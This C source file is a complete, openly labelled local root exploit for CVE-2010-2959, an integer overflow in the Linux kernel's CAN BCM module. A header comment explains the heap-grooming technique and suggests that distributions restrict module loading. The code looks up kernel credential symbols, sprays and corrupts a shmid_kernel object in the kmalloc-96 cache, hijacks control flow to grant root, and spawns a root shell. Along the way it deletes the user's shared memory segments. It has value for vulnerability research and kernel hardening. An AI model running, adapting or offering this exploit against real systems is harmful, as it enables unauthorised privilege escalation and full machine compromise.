/*
 * i-CAN-haz-MODHARDEN.c
 *
 * Linux Kernel < 2.6.36-rc1 CAN BCM Privilege Escalation Exploit
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2959
 *
 *   Ben Hawkes discovered an integer overflow in the Controller Area Network
 *   (CAN) subsystem when setting up frame content and filtering certain
 *   messages. An attacker could send specially crafted CAN traffic to crash
 *   the system or gain root privileges.
 *
 * Usage:
 *
 *   $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
 *   $ ./i-can-haz-modharden
 *   ...
 *   [+] launching root shell!
 *   # id
 *   uid=0(root) gid=0(root)
 *
 * Notes:
 *
 *   The allocation pattern of the CAN BCM module gives us some desirable
 *   properties for smashing the SLUB. We control the kmalloc with a 16-byte
 *   granularity allowing us to place our allocation in the SLUB cache of our
 *   choosing (we'll use kmalloc-96 and smash a shmid_kernel struct for
 *   old-times sake). The allocation can also be made in its own discrete
 *   stage before the overwrite which allows us to be a bit more conservative
 *   in ensuring the proper layout of our SLUB cache.
 *
 *   To exploit the vulnerability, we first create a BCM RX op with a crafted
 *   nframes to trigger the integer overflow during the kmalloc. On the second
 *   call to update the existing RX op, we bypass the E2BIG check since the
 *   stored nframes in the op is large, yet has an insufficiently sized
 *   allocation associated with it. We then have a controlled write into the
 *   adjacent shmid_kernel object in the 96-byte SLUB cache.
 *
 *   However, while we control the length of the SLUB overwrite via a
 *   memcpy_fromiovec operation, there exists a memset operation that directly
 *   follows which zeros out last_frames, likely an adjacent allocation, with
 *   the same malformed length, effectively nullifying our shmid smash. To
 *   work around this, we take advantage of the fact that copy_from_user can
 *   perform partial writes on x86 and trigger an EFAULT by setting up a
 *   truncated memory mapping as the source for the memcpy_fromiovec operation,
 *   allowing us to smash the necessary amount of memory and then pop out and
 *   return early before the memset operation occurs.
 *
 *   We then perform a dry-run and detect the shmid smash via an EIDRM errno
 *   from shmat() caused by an invalid ipc_perm sequence number. Once we're
 *   sure we have a shmid_kernel under our control we re-smash it with the
 *   malformed version and redirect control flow to our credential modifying
 *   calls mapped in user space.
 *
 *   Distros: please use grsecurity's MODHARDEN or SELinux's module_request
 *   to restrict unprivileged loading of uncommon packet families. Allowing
 *   the loading of poorly-written PF modules just adds a non-trivial and
 *   unnecessary attack surface to the kernel.
 *
 *   Targeted for 32-bit Ubuntu Lucid 10.04 (2.6.32-21-generic), but ports
 *   easily to other vulnerable kernels/distros. Careful, it could use some
 *   post-exploitation stability love as well.
 *
 *   Props to twiz, sgrakkyu, spender, qaaz, and anyone else I missed that
 *   this exploit borrows code from.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define SLUB "kmalloc-96"
#define ALLOCATION 96
#define FILLER 100

#ifndef PF_CAN
#define PF_CAN 29
#endif

#ifndef CAN_BCM
#define CAN_BCM 2
#endif

struct sockaddr_can {
	sa_family_t can_family;
	int can_ifindex;
	union {
		struct { uint32_t rx_id, tx_id; } tp;
	} can_addr;
};

struct can_frame {
	uint32_t can_id;
	uint8_t can_dlc;
	uint8_t data[8] __attribute__((aligned(8)));
};

struct bcm_msg_head {
	uint32_t opcode;
	uint32_t flags;
	uint32_t count;
	struct timeval ival1, ival2;
	uint32_t can_id;
	uint32_t nframes;
	struct can_frame frames[0];
};

#define RX_SETUP 5
#define RX_DELETE 6
#define CFSIZ sizeof(struct can_frame)
#define MHSIZ sizeof(struct bcm_msg_head)
#define IPCMNI 32768
#define	EIDRM 43
#define HDRLEN_KMALLOC 8

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct super_block {
	struct list_head s_list;
	unsigned int s_dev;
	unsigned long s_blocksize;
	unsigned char s_blocksize_bits;
	unsigned char s_dirt;
	uint64_t s_maxbytes;
	void *s_type;
	void *s_op;
	void *dq_op;
	void *s_qcop;
	void *s_export_op;
	unsigned long s_flags;
} super_block;

struct mutex {
	unsigned int count;
	unsigned int wait_lock;
	struct list_head wait_list;
	void *owner;
};

struct inode {
	struct list_head i_hash;
	struct list_head i_list;
	struct list_head i_sb_list;
	struct list_head i_dentry_list;
	unsigned long i_ino;
	unsigned int i_count;
	unsigned int i_nlink;
	unsigned int i_uid;
	unsigned int i_gid;
	unsigned int i_rdev;
	uint64_t i_version;
	uint64_t i_size;
	unsigned int i_size_seqcount;
	long i_atime_tv_sec;
	long i_atime_tv_nsec;
	long i_mtime_tv_sec;
	long i_mtime_tv_nsec;
	long i_ctime_tv_sec;
	long i_ctime_tv_nsec;
	uint64_t i_blocks;
	unsigned int i_blkbits;
	unsigned short i_bytes;
	unsigned short i_mode;
	unsigned int i_lock;
	struct mutex i_mutex;
	unsigned int i_alloc_sem_activity;
	unsigned int i_alloc_sem_wait_lock;
	struct list_head i_alloc_sem_wait_list;
	void *i_op;
	void *i_fop;
	struct super_block *i_sb;
	void *i_flock;
	void *i_mapping;
	char i_data[84];
	void *i_dquot_1;
	void *i_dquot_2;
	struct list_head i_devices;
	void *i_pipe_union;
	unsigned int i_generation;
	unsigned int i_fsnotify_mask;
	void *i_fsnotify_mark_entries;
	struct list_head inotify_watches;
	struct mutex inotify_mutex;
} inode;

struct dentry {
	unsigned int d_count;
	unsigned int d_flags;
	unsigned int d_lock;
	int d_mounted;
	void *d_inode;
	struct list_head d_hash;
	void *d_parent;
} dentry;

struct file_operations {
	void *owner;
	void *llseek;
	void *read;
	void *write;
	void *aio_read;
	void *aio_write;
	void *readdir;
	void *poll;
	void *ioctl;
	void *unlocked_ioctl;
	void *compat_ioctl;
	void *mmap;
	void *open;
	void *flush;
	void *release;
	void *fsync;
	void *aio_fsync;
	void *fasync;
	void *lock;
	void *sendpage;
	void *get_unmapped_area;
	void *check_flags;
	void *flock;
	void *splice_write;
	void *splice_read;
	void *setlease;
} op;

struct vfsmount {
	struct list_head mnt_hash;
	void *mnt_parent;
	void *mnt_mountpoint;
	void *mnt_root;
	void *mnt_sb;
	struct list_head mnt_mounts;
	struct list_head mnt_child;
	int mnt_flags;
	const char *mnt_devname;
	struct list_head mnt_list;
	struct list_head mnt_expire;
	struct list_head mnt_share;
	struct list_head mnt_slave_list;
	struct list_head mnt_slave;
	struct vfsmount *mnt_master;
	struct mnt_namespace *mnt_ns;
	int mnt_id;
	int mnt_group_id;
	int mnt_count;
} vfsmount;

struct file {
	struct list_head fu_list;
	struct vfsmount *f_vfsmnt;
	struct dentry *f_dentry;
	void *f_op;
	unsigned int f_lock;
	unsigned long f_count;
} file;

struct kern_ipc_perm {
	unsigned int lock;
	int deleted;
	int id;
	unsigned int key;
	unsigned int uid;
	unsigned int gid;
	unsigned int cuid;
	unsigned int cgid;
	unsigned int mode;
	unsigned int seq;
	void *security;
};

struct shmid_kernel {
	struct kern_ipc_perm shm_perm;
	struct file *shm_file;
	unsigned long shm_nattch;
	unsigned long shm_segsz;
	time_t shm_atim;
	time_t shm_dtim;
	time_t shm_ctim;
	unsigned int shm_cprid;
	unsigned int shm_lprid;
	void *mlock_user;
} shmid_kernel;

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int __attribute__((regparm(3)))
kernel_code(struct file *file, void *vma)
{
	commit_creds(prepare_kernel_cred(0));
	return -1;
}

unsigned long
get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	int ret = 0, oldstyle;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL)
			return 0;
		oldstyle = 1;
	}

	while (ret != EOF) {
		if (!oldstyle) {
			ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
		} else {
			ret = fscanf(f, "%p %s\n", (void **) &addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S.")) {
					continue;
				}
				p = strrchr(sname, '_');
				if (p > ((char *) sname + 5) && !strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p > (char *)sname && *(p - 1) == '_') {
						p--;
					}
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);

	return 0;
}

int
check_slabinfo(char *cache, int *active_out, int *total_out)
{
	FILE *fp;
	char name[64], slab[256];
	int active, total, diff;

	memset(slab, 0, sizeof(slab));
	memset(name, 0, sizeof(name));

	fp = fopen("/proc/slabinfo", "r");
	if (!fp) {
		printf("[-] sorry, /proc/slabinfo is not available!");
		exit(1);
	}

	fgets(slab, sizeof(slab) - 1, fp);
	while (1) {
		fgets(slab, sizeof(slab) - 1, fp);
		sscanf(slab, "%s %u %u", name, &active, &total);
		diff = total - active;
		if (strcmp(name, cache) == 0) {
			break;
		}
	}
	fclose(fp);

	if (active_out) {
		*active_out = active;
	}
	if (total_out) {
		*total_out = total;
	}
	return diff;
}

void
trigger(void)
{
	int *shmids;
	int i, ret, sock, cnt, base, smashed;
	int diff, active, total, active_new, total_new;
	int len, sock_len, mmap_len;
	struct sockaddr_can addr;
	struct bcm_msg_head *msg;
	void *efault;
	char *buf;

	printf("[+] creating PF_CAN socket...\n");

	sock = socket(PF_CAN, SOCK_DGRAM, CAN_BCM);
	if (sock < 0) {
		printf("[-] kernel lacks CAN packet family support\n");
		exit(1);
	}

	printf("[+] connecting PF_CAN socket...\n");

	memset(&addr, 0, sizeof(addr));
	addr.can_family = PF_CAN;

	ret = connect(sock, (struct sockaddr *) &addr, sizeof(addr));
	if (sock < 0) {
		printf("[-] could not connect CAN socket\n");
		exit(1);
	}

	len = MHSIZ + (CFSIZ * (ALLOCATION / 16));
	msg = malloc(len);
	memset(msg, 0, len);
	msg->can_id = 2959;
	msg->nframes = (UINT_MAX / CFSIZ) + (ALLOCATION / 16) + 1;

	printf("[+] clearing out any active OPs via RX_DELETE...\n");

	msg->opcode = RX_DELETE;
	ret = send(sock, msg, len, 0);

	printf("[+] removing any active user-owned shmids...\n");

	system("for shmid in `cat /proc/sysvipc/shm | awk '{print $2}'`; do ipcrm -m $shmid > /dev/null 2>&1; done;");

	printf("[+] massaging " SLUB " SLUB cache with dummy allocations\n");

	diff = check_slabinfo(SLUB, &active, &total);

	shmids = malloc(sizeof(int) * diff * 10);

	cnt = diff * 10;
	for (i = 0; i < cnt; ++i) {
		diff = check_slabinfo(SLUB, &active, &total);
		if (diff == 0) {
			break;
		}
		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	}
	base = i;

	if (diff != 0) {
		printf("[-] inconsistency detected with SLUB cache allocation, please try again\n");
		exit(1);
	}

	printf("[+] corrupting BCM OP with truncated allocation via RX_SETUP...\n");

	i = base;
	cnt = i + FILLER;
	for (; i < cnt; ++i) {
		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	}

	msg->opcode = RX_SETUP;
	ret = send(sock, msg, len, 0);
	if (ret < 0) {
		printf("[-] kernel rejected malformed CAN header\n");
		exit(1);
	}

	i = base + FILLER;
	cnt = i + FILLER;
	for (; i < cnt; ++i) {
		shmids[i] = shmget(IPC_PRIVATE, 1024, IPC_CREAT);
	}

	printf("[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...\n");

	mmap_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 3);
	sock_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 4);
	efault = mmap(NULL, mmap_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	printf("[+] mmap'ed mapping of length %d at %p\n", mmap_len, efault);

	printf("[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...\n");

	msg = (struct bcm_msg_head *) efault;
	memset(msg, 0, mmap_len);
	msg->can_id = 2959;
	msg->nframes = (ALLOCATION / 16) * 4;

	msg->opcode = RX_SETUP;
	ret = send(sock, msg, mmap_len, 0);
	if (ret != -1 && errno != EFAULT) {
		printf("[-] couldn't trigger EFAULT, exploit aborting!\n");
		exit(1);
	}

	printf("[+] seeking out the smashed shmid_kernel...\n");

	i = base;
	cnt = i + FILLER + FILLER;
	for (; i < cnt; ++i) {
		ret = (int) shmat(shmids[i], NULL, SHM_RDONLY);
		if (ret == -1 && errno == EIDRM) {
			smashed = i;
			break;
		}
	}
	if (i == cnt) {
		printf("[-] could not find smashed shmid, trying running the exploit again!\n");
		exit(1);
	}

	printf("[+] discovered our smashed shmid_kernel at shmid[%d] = %d\n", i, shmids[i]);

	printf("[+] re-smashing the shmid_kernel with exploit payload...\n");

	shmid_kernel.shm_perm.seq = shmids[smashed] / IPCMNI;

	buf = (char *) msg;
	memcpy(&buf[MHSIZ + (ALLOCATION * 2) + HDRLEN_KMALLOC], &shmid_kernel, sizeof(shmid_kernel));

	msg->opcode = RX_SETUP;
	ret = send(sock, msg, mmap_len, 0);
	if (ret != -1 && errno != EFAULT) {
		printf("[-] couldn't trigger EFAULT, exploit aborting!\n");
		exit(1);
	}

	ret = (int) shmat(shmids[smashed], NULL, SHM_RDONLY);
	if (ret == -1 && errno != EIDRM) {
		setresuid(0, 0, 0);
		setresgid(0, 0, 0);

		printf("[+] launching root shell!\n");

		execl("/bin/bash", "/bin/bash", NULL);
		exit(0);
	}

	printf("[-] exploit failed! retry?\n");
}

void
setup(void)
{
	printf("[+] looking for symbols...\n");

	commit_creds = (_commit_creds) get_symbol("commit_creds");
	if (!commit_creds) {
		printf("[-] symbol table not availabe, aborting!\n");
	}

	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
	if (!prepare_kernel_cred) {
		printf("[-] symbol table not availabe, aborting!\n");
	}

	printf("[+] setting up exploit payload...\n");

	super_block.s_flags = 0;

	inode.i_size = 4096;
	inode.i_sb = &super_block;
	inode.inotify_watches.next = &inode.inotify_watches;
	inode.inotify_watches.prev = &inode.inotify_watches;
	inode.inotify_mutex.count = 1;

	dentry.d_count = 4096;
	dentry.d_flags = 4096;
	dentry.d_parent = NULL;
	dentry.d_inode = &inode;

	op.mmap = &kernel_code;
	op.get_unmapped_area = &kernel_code;

	vfsmount.mnt_flags = 0;
	vfsmount.mnt_count = 1;

	file.fu_list.prev = &file.fu_list;
	file.fu_list.next = &file.fu_list;
	file.f_dentry = &dentry;
	file.f_vfsmnt = &vfsmount;
	file.f_op = &op;

	shmid_kernel.shm_perm.key = IPC_PRIVATE;
	shmid_kernel.shm_perm.uid = getuid();
	shmid_kernel.shm_perm.gid = getgid();
	shmid_kernel.shm_perm.cuid = getuid();
	shmid_kernel.shm_perm.cgid = getgid();
	shmid_kernel.shm_perm.mode = -1;
	shmid_kernel.shm_file = &file;
}

int
main(int argc, char **argv)
{
	setup();
	trigger();
	return 0;
}